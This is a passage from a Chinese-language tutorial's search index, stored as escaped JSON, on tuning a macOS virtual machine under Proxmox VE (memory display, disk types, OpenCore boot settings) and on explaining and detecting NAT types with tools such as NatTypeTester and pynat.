\u200b\u673a\u578b\u200b\u4e0b\u200b\uff0c\u200b\u5185\u5b58\u200b\u663e\u793a\u200b\u4e0d\u200b\u6b63\u5e38\u200b\uff0c\u200b\u9891\u7387\u200b\u662f\u200b\u672a\u77e5\u200b\u7684\u200b\uff0c\u200b\u800c\u4e14\u200b\u8fd8\u6709\u200b\u544a\u8b66\u200b\u63d0\u793a\u200b\uff1a</p> <p> </p> <p>\u200b\u4f5c\u4e3a\u200b\u9ed1\u200b\u82f9\u679c\u200b\u804c\u4e1a\u200b\u73a9\u5bb6\u200b\uff0c\u200b\u8fd9\u200b\u600e\u4e48\u200b\u80fd\u5fcd\u200b\uff0c\u200b\u5fc5\u987b\u200b\u5b9a\u5236\u200b\u4e00\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u7ec8\u200b MacPro7,1 \u200b\u673a\u578b\u200b\u5185\u5b58\u200b\u4fee\u6b63\u200b\u540e\u200b\u7684\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p></p> <p> </p> <p> </p>"},{"location":"7/4/#_11","title":"\u786c\u76d8\u200b\u5bf9\u6bd4","text":"<p>VirtIO Block \u200b\u786c\u76d8\u200b\u7c7b\u578b\u200b\u662f\u200b\u9ed1\u200b\u82f9\u679c\u200b\u4e0b\u200b\u6700\u5feb\u200b\u7684\u200b\u786c\u76d8\u200b\u7c7b\u578b\u200b\u4e86\u200b\uff0c\u200b\u5728\u200b 4k \u200b\u6d4b\u8bd5\u200b\u4e0b\u200b\u63d0\u5347\u200b\u5c24\u4e3a\u200b\u660e\u663e\u200b\uff0c\u200b\u4f46\u662f\u200b\u6b64\u65f6\u200b QQ \u200b\u4f1a\u200b\u65e0\u6cd5\u200b\u6253\u5f00\u200b\uff0c\u200b\u53ea\u80fd\u200b\u6362\u200b\u517c\u5bb9\u6027\u200b\u597d\u200b\u7684\u200b SATA \u200b\u786c\u76d8\u200b\u624d\u200b\u53ef\u4ee5\u200b\u89e3\u51b3\u95ee\u9898\u200b\u3002</p> SATA \u200b\u786c\u76d8\u200b\u7c7b\u578b\u200bVirtIO Block \u200b\u786c\u76d8\u200b\u7c7b\u578b\u200b <p></p> <p>\u200b\u8bfb\u5199\u200b\u901f\u5ea6\u200b\u6d4b\u8bd5\u200b\uff1a</p> <p></p> <p></p> <p>\u200b\u8bfb\u5199\u200b\u901f\u5ea6\u200b\u6d4b\u8bd5\u200b\uff1a</p> <p></p>"},{"location":"7/4/#_12","title":"\u786c\u76d8\u200b\u5185\u200b\u5efa","text":"<p>\u200b\u9ed8\u8ba4\u200b PVE \u200b\u4e0b\u200b\u7684\u200b VM \u200b\u628a\u200b\u6211\u4eec\u200b\u7684\u200b SATA \u200b\u786c\u76d8\u200b\u8bc6\u522b\u200b\u6210\u200b\u4e86\u200b\u5916\u7f6e\u200b\u9a71\u52a8\u5668\u200b\uff0c\u200b\u8fd9\u200b\u600e\u4e48\u200b\u80fd\u5fcd\u200b\uff08VirtIO Block \u200b\u786c\u76d8\u200b\u7c7b\u578b\u200b\u5219\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\uff09\uff1a</p> <p> </p> <p>\u200b\u4f7f\u7528\u200b OCC \u200b\u7f16\u8f91\u5668\u200b\u6dfb\u52a0\u200b\u5f53\u524d\u200b\u7684\u200b\u4e24\u4e2a\u200b SATA controller\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u5747\u200b\u6dfb\u52a0\u200b built-in \u200b\u5c5e\u6027\u200b\uff0c\u200b\u503c\u4e3a\u200b\uff1a01000000</p> <p> </p> <p>\u200b\u91cd\u542f\u200b\u540e\u200b\uff0c\u200b\u6700\u7ec8\u200b\u786c\u76d8\u200b\u5185\u5efa\u200b\u7684\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p>"},{"location":"7/4/#_13","title":"\u5f00\u673a\u200b\u81ea\u542f","text":"<p>\u200b\u9ed8\u8ba4\u200b\u7684\u200b OpenCore \u200b\u5982\u679c\u200b\u6211\u4eec\u200b\u4e0d\u200b\u6309\u200b\u56de\u8f66\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4f1a\u200b\u4e00\u76f4\u200b\u5361\u200b\u5728\u200b\u7cfb\u7edf\u200b\u9009\u62e9\u200b\u754c\u9762\u200b\u5bfc\u81f4\u200b\u65e0\u6cd5\u200b\u81ea\u52a8\u200b\u8fdb\u5165\u200b\u7cfb\u7edf\u200b\uff1a</p> <p> </p> <p>\u200b\u6211\u4eec\u200b\u53ea\u200b\u9700\u8981\u200b\u7f16\u8f91\u200b OpenCore \u200b\u7684\u200b config.plist \u200b\u6587\u4ef6\u200b\uff0c\u200b\u627e\u5230\u200b\u300cMusc-\u200b\u5176\u4ed6\u200b\u8bbe\u7f6e\u200b\u300d\u200b\u53d6\u6d88\u200b\u52fe\u9009\u200b\u300cShow Picker \u200b\u663e\u793a\u200b\u5f15\u5bfc\u200b\u83dc\u5355\u200b\u300d\u200b\u5373\u53ef\u200b\uff1a</p> <p></p>"},{"location":"8/1/","title":"NAT\u200b\u7c7b\u578b","text":"<p>\u200b\u56e0\u4e3a\u200b\u4e0b\u9762\u200b\u7684\u200b\u7ae0\u8282\u200b\u4e2d\u200b\u63d0\u5230\u200b\u7684\u200b ZeroTier \u200b\u662f\u200b\u57fa\u4e8e\u200b P2P \u200b\u6253\u6d1e\u200b\u65b9\u5f0f\u200b\u51cf\u5c11\u200b\u5ef6\u8fdf\u200b\u4f18\u5316\u200b\u4f20\u8f93\u200b\u4f53\u9a8c\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5fc5\u5b9a\u4f1a\u200b\u6d89\u53ca\u200b\u5230\u200b NAT \u200b\u7c7b\u578b\u200b\u7684\u200b\u57fa\u7840\u77e5\u8bc6\u200b\uff0c\u200b\u5176\u5b9e\u200b NAT \u200b\u7c7b\u578b\u200b\u6211\u4eec\u200b\u4e4b\u524d\u200b\u5927\u200b\u6982\u7387\u200b\u5e94\u8be5\u200b\u4e5f\u200b\u63a5\u89e6\u200b\u8fc7\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u8054\u673a\u200b\u6e38\u620f\u200b\u4e5f\u200b\u7ecf\u5e38\u200b\u6d89\u53ca\u200b\u5230\u200b\u8fd9\u5757\u200b\uff0cNAT \u200b\u7c7b\u578b\u200b\u5f88\u5dee\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u8054\u673a\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u5f88\u200b\u9ad8\u200b\uff0c\u200b\u6ca1\u6709\u200b\u6e38\u620f\u200b\u4f53\u9a8c\u200b\u3002</p>"},{"location":"8/1/#nat","title":"NAT \u200b\u57fa\u7840\u200b\u6982\u5ff5","text":"<p>NAT\uff08Network Address Translation \u200b\u7f51\u7edc\u5730\u5740\u200b\u8f6c\u6362\u200b\uff09\u200b\u662f\u200b\u4e00\u79cd\u200b\u7f51\u7edc\u200b\u6280\u672f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u516c\u5171\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u5728\u200b Internet \u200b\u4e0a\u200b\u8fdb\u884c\u200b\u901a\u4fe1\u200b\u3002\u200b\u8bbe\u8ba1\u200b\u4e4b\u521d\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u4e3a\u4e86\u200b\u8282\u7701\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u907f\u514d\u51fa\u73b0\u200b IPv4 \u200b\u5730\u5740\u200b\u6c60\u200b\u8017\u5c3d\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u8ba9\u200b\u4e00\u4e9b\u200b\u5bb6\u7528\u200b\u8bbe\u5907\u200b\u7684\u200b\u66f4\u52a0\u200b\u5b89\u5168\u200b\uff0c\u200b\u51cf\u5c11\u200b\u4e86\u200b\u76f4\u63a5\u200b\u88ab\u200b\u5916\u90e8\u200b\u653b\u51fb\u200b\u7684\u200b\u98ce\u9669\u200b\u3002\u200b\u4f46\u662f\u200b\u7f3a\u70b9\u200b\u4e5f\u200b\u6bd4\u8f83\u200b\u660e\u663e\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u8054\u673a\u200b\u6e38\u620f\u200b\u6216\u8005\u200b\u6d89\u53ca\u200b\u5230\u200b P2P \u200b\u6253\u6d1e\u200b\u7684\u200b\u65b9\u6848\u200b\u4e2d\u200b\uff0cNAT \u200b\u8d8a\u200b\u590d\u6742\u200b\uff0c\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u6211\u4eec\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u6216\u8005\u200b\u4e0b\u8f7d\u901f\u5ea6\u200b\u8d8a\u5dee\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u4e00\u4e9b\u200b\u8054\u673a\u200b\u6e38\u620f\u200b\u6ca1\u6cd5\u200b\u6109\u5feb\u200b\u7684\u200b\u73a9\u800d\u200b\u3002</p>"},{"location":"8/1/#nat_1","title":"NAT \u200b\u7c7b\u578b\u200b\u6807\u51c6","text":""},{"location":"8/1/#_1","title":"\u6807\u51c6\u200b\u4e00","text":"<ul> <li> <p> NAT type 1 - Open</p> <p>\u200b\u5f00\u653e\u5f0f\u200b NAT \u200b\u7c7b\u578b\u200b\uff0c\u200b\u65e0\u200b\u4efb\u4f55\u200b\u9650\u5236\u200b\uff0c\u200b\u6240\u6709\u200b\u8bbe\u5907\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u81ea\u7531\u200b\u53d1\u9001\u200b\u548c\u200b\u63a5\u6536\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6ca1\u6709\u200b\u9632\u706b\u5899\u200b\u3002\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u8f7b\u677e\u200b\u4e0e\u200b\u5176\u4ed6\u200b NAT \u200b\u7c7b\u578b\u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u4ea4\u4e92\u200b\u3002</p> </li> <li> <p> NAT type 2 - Moderate</p> <p>\u200b\u4e2d\u7b49\u200b\u9002\u5ea6\u200b\u5f0f\u200b NAT \u200b\u7c7b\u578b\u200b\uff0c\u200b\u5b89\u5168\u6027\u200b\u8981\u200b\u9ad8\u200b\u4e00\u70b9\u200b\uff0c\u200b\u4ec5\u200b\u5f00\u53d1\u200b\u51e0\u4e2a\u200b\u7aef\u53e3\u200b\uff0c\u200b\u4f9d\u7136\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u9632\u706b\u5899\u200b\u6765\u200b\u4fdd\u62a4\u200b\u6211\u4eec\u200b\u7684\u200b\u8bbe\u5907\u200b\u5b89\u5168\u200b\uff0c\u200b\u4f46\u200b\u540c\u65f6\u200b\u4e5f\u200b\u4f1a\u200b\u7565\u5fae\u200b\u964d\u4f4e\u200b\u6211\u4eec\u200b\u8bbe\u5907\u200b\u7684\u200b\u4e92\u8054\u7f51\u200b\u901f\u5ea6\u200b\u3002</p> </li> <li> <p> NAT type 3 - Strict</p> <p>\u200b\u4e25\u683c\u200b\u5f0f\u200b NAT \u200b\u7c7b\u578b\u200b\uff0c\u200b\u8fd9\u200b\u662f\u200b\u6700\u200b\u4e25\u683c\u200b\u7684\u200b NAT \u200b\u7c7b\u578b\u200b\uff0c\u200b\u5b89\u5168\u6027\u200b\u6700\u9ad8\u200b\uff0c\u200b\u4f46\u200b\u4e5f\u200b\u662f\u200b\u4e0a\u7f51\u200b\u4f53\u9a8c\u200b\u6700\u5dee\u200b\u7684\u200b\u4e00\u79cd\u200b\u7c7b\u578b\u200b\uff0c\u200b\u4f1a\u200b\u51cf\u6162\u200b\u6211\u4eec\u200b\u7684\u200b\u4e92\u8054\u7f51\u200b\u8bbf\u95ee\u901f\u5ea6\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u589e\u52a0\u200b\u6e38\u620f\u200b\u7684\u200b\u5ef6\u65f6\u200b\u3002</p> </li> </ul>"},{"location":"8/1/#_2","title":"\u6807\u51c6\u200b\u4e8c","text":"<ul> <li> <p> Static NAT</p> <p>\u200b\u9759\u6001\u200b NAT\uff1a\u200b\u9759\u200b\u5c06\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u4e00\u4e00\u200b\u6620\u5c04\u200b\u5230\u200b\u516c\u5171\u200b IP \u200b\u5730\u5740\u200b\u4e0a\u200b\u3002\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u4e3b\u8981\u200b\u7528\u4e8e\u200b\u670d\u52a1\u5668\u200b\u7f51\u7edc\u200b\u4e2d\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u8ba9\u200b\u5916\u90e8\u200b\u7f51\u7edc\u200b\u8bbf\u95ee\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u670d\u52a1\u200b\u3002</p> </li> <li> <p> Dynamic NAT</p> <p>\u200b\u52a8\u6001\u200b NAT\uff1a\u200b\u52a8\u6001\u200b NAT \u200b\u5c06\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b IP \u200b\u5730\u5740\u6620\u5c04\u200b\u5230\u200b\u516c\u5171\u200b IP \u200b\u5730\u5740\u200b\u6c60\u4e2d\u200b\u7684\u200b\u5730\u5740\u200b\u4e0a\u200b\u3002\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u4e3b\u8981\u200b\u7528\u4e8e\u200b\u5ba2\u6237\u7aef\u200b\u7f51\u7edc\u200b\u4e2d\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u8ba9\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\u8bbf\u95ee\u200b Internet\u3002</p> </li> <li> <p> Overloading / Port Address Translation (PAT)</p> <p>\u200b\u9690\u85cf\u200b NAT\uff1a\u200b\u662f\u200b\u4e00\u79cd\u200b\u7279\u6b8a\u200b\u7684\u200b NAT \u200b\u65b9\u5f0f\u200b\uff0c\u200b\u5b83\u200b\u5c06\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b IP \u200b\u5730\u5740\u6620\u5c04\u200b\u5230\u200b\u516c\u5171\u200b IP \u200b\u5730\u5740\u200b\u6c60\u4e2d\u200b\u7684\u200b\u5730\u5740\u200b\u4e0a\u200b\uff0c\u200b\u5e76\u200b\u5c06\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u5730\u5740\u200b\u9690\u85cf\u200b\u8d77\u6765\u200b\u3002\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u4e3b\u8981\u200b\u7528\u4e8e\u200b\u7f51\u7edc\u5b89\u5168\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9690\u85cf\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u63d0\u9ad8\u200b\u5b89\u5168\u6027\u200b\u3002</p> <p>PAT \u200b\u662f\u200b\u4e00\u79cd\u200b\u7279\u6b8a\u200b\u7684\u200b\u52a8\u6001\u200b NAT\uff0c\u200b\u5b83\u200b\u5c06\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u548c\u200b\u7aef\u53e3\u53f7\u200b\u6620\u5c04\u200b\u5230\u200b\u516c\u5171\u200b IP \u200b\u5730\u5740\u200b\u6c60\u4e2d\u200b\u7684\u200b\u5730\u5740\u200b\u4e0a\u200b\u3002\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u4e5f\u200b\u662f\u200b\u4e00\u79cd\u200b\u9690\u85cf\u200b NAT \u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u7528\u6765\u200b\u89e3\u51b3\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u5730\u5740\u200b\u8d44\u6e90\u200b\u4e0d\u8db3\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p> </li> </ul>"},{"location":"8/1/#_3","title":"\u6807\u51c6\u200b\u4e09","text":"<ul> <li> <p> Full-cone NAT</p> <p>\u200b\u5168\u200b\u9525\u5f62\u200b NAT\uff1a\u200b\u5bf9\u4e8e\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u4efb\u610f\u200b\u4e3b\u673a\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8fde\u63a5\u200b\u5916\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u4efb\u610f\u200b\u4e3b\u673a\u200b\u3002\u200b\u4f18\u70b9\u200b\u662f\u200b\u8fde\u63a5\u200b\u7b80\u5355\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8fde\u63a5\u200b\u4efb\u610f\u200b\u4e3b\u673a\u200b\uff0c\u200b\u7f3a\u70b9\u200b\u662f\u200b\u5730\u5740\u200b\u8d44\u6e90\u200b\u6d6a\u8d39\u200b\uff0c\u200b\u5bb9\u6613\u200b\u53d7\u5230\u200b\u653b\u51fb\u200b\u3002</p> </li> <li> <p> Restricted-cone NAT</p> <p>\u200b\u9650\u5236\u200b\u9525\u5f62\u200b NAT\uff1a\u200b\u5bf9\u4e8e\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u4e3b\u673a\u200b\u53ea\u80fd\u200b\u8fde\u63a5\u200b\u5916\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u5df2\u7ecf\u200b\u5efa\u7acb\u200b\u8fde\u63a5\u200b\u7684\u200b\u4e3b\u673a\u200b\u3002\u200b\u4f18\u70b9\u200b\u662f\u200b\u63d0\u9ad8\u200b\u5b89\u5168\u6027\u200b\uff0c\u200b\u7f3a\u70b9\u200b\u662f\u200b\u9700\u8981\u200b\u9884\u5148\u200b\u5efa\u7acb\u200b\u8fde\u63a5\u200b\uff0c\u200b\u8fde\u63a5\u200b\u6570\u91cf\u200b\u6709\u9650\u200b\u3002</p> </li> <li> <p> Port-restricted cone NAT</p> <p>\u200b\u7aef\u53e3\u200b\u9650\u5236\u200b\u9525\u5f62\u200b NAT\uff1a\u200b\u4e0e\u200b\u9650\u5236\u200b\u9525\u5f62\u200b NAT \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4f46\u662f\u200b\u9650\u5236\u200b\u662f\u200b\u9488\u5bf9\u200b\u7aef\u53e3\u53f7\u200b\u800c\u200b\u4e0d\u662f\u200b IP \u200b\u5730\u5740\u200b\u3002\u200b\u4f18\u70b9\u200b\u662f\u200b\u63d0\u9ad8\u200b\u5b89\u5168\u6027\u200b\uff0c\u200b\u7f3a\u70b9\u200b\u662f\u200b\u7aef\u53e3\u200b\u8d44\u6e90\u200b\u6d6a\u8d39\u200b\uff0c\u200b\u9700\u8981\u200b\u9884\u5148\u200b\u5efa\u7acb\u200b\u8fde\u63a5\u200b\u3002</p> </li> <li> <p> Symmetric NAT</p> <p>\u200b\u5bf9\u79f0\u200b NAT\uff1a\u200b\u5bf9\u4e8e\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u4e3b\u673a\u200b\u6765\u8bf4\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u8fde\u63a5\u200b\u90fd\u200b\u9700\u8981\u200b\u91cd\u65b0\u200b\u6620\u5c04\u200b\u3002\u200b\u4f18\u70b9\u200b\u662f\u200b\u63d0\u9ad8\u200b\u5b89\u5168\u6027\u200b\uff0c\u200b\u7f3a\u70b9\u200b\u662f\u200b\u8fde\u63a5\u200b\u7e41\u7410\u200b\uff0c\u200b\u5730\u5740\u200b\u8d44\u6e90\u200b\u6d6a\u8d39\u200b\u3002</p> </li> </ul>"},{"location":"8/1/#nat_2","title":"\u68c0\u6d4b\u200b NAT \u200b\u7c7b\u578b","text":"<ul> <li> Windows Xbox \u200b\u4e3b\u673a\u200b\u5c0f\u200b\u52a9\u624b\u200b</li> </ul> <p>Windows \u200b\u4e0b\u200b\u6d4b\u8bd5\u200b NAT \u200b\u7c7b\u578b\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff0c\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b\u662f\u200b\u5e94\u7528\u200b\u5546\u5e97\u200b\u91cc\u9762\u200b\u4e0b\u8f7d\u200b Xbox \u200b\u4e3b\u673a\u200b\u5c0f\u200b\u52a9\u624b\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u8bbe\u7f6e\u200b\u91cc\u9762\u200b\u7684\u200b\u7f51\u7edc\u200b\u90e8\u5206\u200b\u68c0\u6d4b\u200b NAT \u200b\u7c7b\u578b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u51fa\u200b Xbox \u200b\u7684\u200b NAT \u200b\u7c7b\u578b\u200b\u7684\u200b\u68c0\u6d4b\u200b\u6807\u51c6\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b\u6211\u4eec\u200b\u672c\u6587\u200b\u4e0a\u9762\u200b\u7684\u200b\u300c\u200b\u6807\u51c6\u200b\u4e00\u200b\u300d\uff1a</p> <p> </p> <ul> <li> Windows \u200b\u5f00\u6e90\u200b\u9879\u76ee\u200b NatTypeTester</li> </ul> <p>Windows \u200b\u4e0b\u200b\u6d4b\u8bd5\u200b\u5f53\u524d\u200b\u7f51\u7edc\u200b\u7684\u200b NAT \u200b\u7c7b\u578b\u200b\uff08STUN\uff09\u200b\u7684\u200b\u5c0f\u200b\u5de5\u5177\u200b\uff0c\u200b\u6d4b\u8bd5\u200b\u8d77\u6765\u200b\u4e5f\u200b\u5341\u5206\u200b\u7b80\u5355\u200b\u65b9\u4fbf\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f88\u200b\u76f4\u89c2\u200b\u7684\u200b\u4e86\u89e3\u200b\u6211\u4eec\u200b\u7684\u200b NAT \u200b\u7c7b\u578b\u200b\uff0c\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b RFC 3489 \u200b\u6807\u51c6\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6211\u4eec\u200b\u672c\u6587\u200b\u4e0a\u9762\u200b\u7684\u200b\u300c\u200b\u6807\u51c6\u200b\u4e09\u200b\u300d\uff1a </p> <p> </p> <ul> <li> Pyton \u200b\u5305\u200b pynat</li> </ul> Bash<pre><code># \u200b\u5b89\u88c5\u200b python3 \u200b\u7684\u200b pip \u200b\u5305\u200b\u7ba1\u7406\u5de5\u5177\u200b\napt instll python3-pip\n\n# \u200b\u5b89\u88c5\u200b pynat\npip install pynat\n\n# \u200b\u68c0\u6d4b\u200b\u5f53\u524d\u200b NAT \u200b\u7c7b\u578b\u200b\npynat\n</code></pre> <p> </p> \u200b\u56fd\u5149\u200b\u5c0f\u200b\u8bfe\u5802\u200b\uff1aRFC 3489 \u200b\u662f\u200b\u4ec0\u4e48\u200b\uff0c\u200b\u548c\u200b NAT \u200b\u4ee5\u53ca\u200b STUN \u200b\u6709\u200b\u4ec0\u4e48\u200b\u5173\u7cfb\u200b\uff1f <p>RFC 3489 \u200b\u662f\u200b\u7531\u200b\u7f51\u7edc\u5de5\u7a0b\u200b\u4efb\u52a1\u200b\u7ec4\u200b (Network Working Group) \u200b\u53d1\u5e03\u200b\u7684\u200b\u4e00\u7bc7\u200b\u6587\u6863\u200b\uff0c\u200b\u5b83\u200b\u5b9a\u4e49\u200b\u4e86\u200b STUN \u200b\u534f\u8bae\u200b\u7684\u200b\u6807\u51c6\u200b\u3002\u200b\u8be5\u200b\u534f\u8bae\u200b\u662f\u200b\u4e00\u79cd\u200b\u7b80\u5355\u200b\u7684\u200b\u57fa\u4e8e\u200b UCP \u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u7528\u4e8e\u200b\u786e\u5b9a\u200b\u7ec8\u7aef\u200b\u4e3b\u673a\u200b\u7684\u200b\u516c\u5171\u200b IP \u200b\u5730\u5740\u200b\u548c\u200b\u7aef\u53e3\u53f7\u200b\u3002</p> <p>STUN \u200b\u534f\u8bae\u200b\u662f\u200b\u5728\u200b RFC 3489 \u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200b\uff0c\u200b\u5b83\u200b\u662f\u200b\u4e00\u79cd\u200b\u7f51\u7edc\u534f\u8bae\u200b\uff0c\u200b\u7528\u4e8e\u200b\u7a7f\u8d8a\u200b NAT \u200b\u9632\u706b\u5899\u200b\u548c\u200b\u9632\u200b\u7f51\u7edc\u5730\u5740\u200b\u8f6c\u6362\u200b (NAT) \u200b\u8bbe\u5907\u200b\u3002STUN \u200b\u7528\u4e8e\u200b\u786e\u5b9a\u200b\u7ec8\u7aef\u200b\u4e3b\u673a\u200b\u7684\u200b\u516c\u5171\u200b IP \u200b\u5730\u5740\u200b\u548c\u200b\u7aef\u53e3\u53f7\u200b\uff0c\u200b\u5e76\u200b\u5c06\u200b\u5176\u200b\u544a\u77e5\u200b\u7ec8\u7aef\u200b\u4e3b\u673a\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u4e0e\u200b\u5176\u4ed6\u200b\u7ec8\u7aef\u200b\u4e3b\u673a\u200b\u8fdb\u884c\u200b\u901a\u4fe1\u200b\u3002</p> <p>NAT \u200b\u662f\u200b\u7f51\u7edc\u5730\u5740\u200b\u8f6c\u6362\u200b\u7684\u200b\u7f29\u5199\u200b\uff0c\u200b\u5b83\u200b\u662f\u200b\u4e00\u79cd\u200b\u7f51\u7edc\u200b\u6280\u672f\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5728\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u548c\u200b\u5916\u90e8\u200b\u7f51\u7edc\u200b\u4e4b\u95f4\u200b\u5efa\u7acb\u200b\u4e00\u4e2a\u200b\u9694\u79bb\u200b\u5c42\u200b\uff0c\u200b\u4ee5\u200b\u4fdd\u62a4\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u514d\u53d7\u200b\u5916\u90e8\u200b\u7f51\u7edc\u200b\u7684\u200b\u653b\u51fb\u200b\u3002STUN \u200b\u534f\u8bae\u200b\u662f\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b NAT \u200b\u5bf9\u200b\u7f51\u7edc\u901a\u4fe1\u200b\u7684\u200b\u5f71\u54cd\u200b\u800c\u200b\u5f00\u53d1\u200b\u7684\u200b\u3002</p> <p>\u200b\u603b\u7ed3\u200b\uff1aRFC 3489 \u200b\u662f\u200b STUN \u200b\u534f\u8bae\u200b\u6807\u51c6\u200b\u5b9a\u4e49\u200b\u6587\u6863\u200b\uff0c\u200b\u5b83\u200b\u63cf\u8ff0\u200b\u4e86\u200b\u5982\u4f55\u200b\u4f7f\u7528\u200b STUN \u200b\u534f\u8bae\u200b\u786e\u5b9a\u200b\u7ec8\u7aef\u200b\u4e3b\u673a\u200b\u7684\u200b\u516c\u5171\u200b IP \u200b\u5730\u5740\u200b\u548c\u200b\u7aef\u53e3\u53f7\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u5b83\u200b\u80fd\u591f\u200b\u7a7f\u8d8a\u200b NAT \u200b\u9632\u706b\u5899\u200b\u548c\u200b\u8fdb\u884c\u200b\u7f51\u7edc\u901a\u4fe1\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u5e2e\u52a9\u200b\u7ec8\u7aef\u200b\u4e3b\u673a\u200b\u4e0e\u200b\u5176\u4ed6\u200b\u7ec8\u7aef\u200b\u4e3b\u673a\u200b\u5efa\u7acb\u200b\u8fde\u63a5\u200b\uff0c\u200b\u6216\u8005\u200b\u5728\u200b\u8de8\u200b\u7f51\u7edc\u200b\u7684\u200b\u89c6\u9891\u200b\u901a\u8bdd\u200b\u6216\u200b\u5373\u65f6\u901a\u8baf\u200b\u5e94\u7528\u200b\u4e2d\u200b\u53d1\u73b0\u200b\u548c\u200b\u89e3\u51b3\u95ee\u9898\u200b\u3002</p>"},{"location":"8/1/#nat_3","title":"\u6539\u5584\u200b NAT \u200b\u7c7b\u578b","text":"<p>\u200b\u5982\u4e0a\u56fe\u200b\u6240\u200b\u89c1\u200b\uff0c\u200b\u6211\u200b\u7684\u200b PVE \u200b\u5de5\u4f5c\u7ad9\u200b\u6240\u5728\u200b\u7684\u200b\u8fd0\u8425\u5546\u200b\u7f51\u7edc\u200b\u73af\u5883\u200b\u7684\u200b NAT \u200b\u7c7b\u578b\u200b\u4e3a\u200b Symmetric NAT\uff0c\u200b\u662f\u200b\u6700\u200b\u4e25\u683c\u200b\u7684\u200b\u4e00\u79cd\u200b NAT 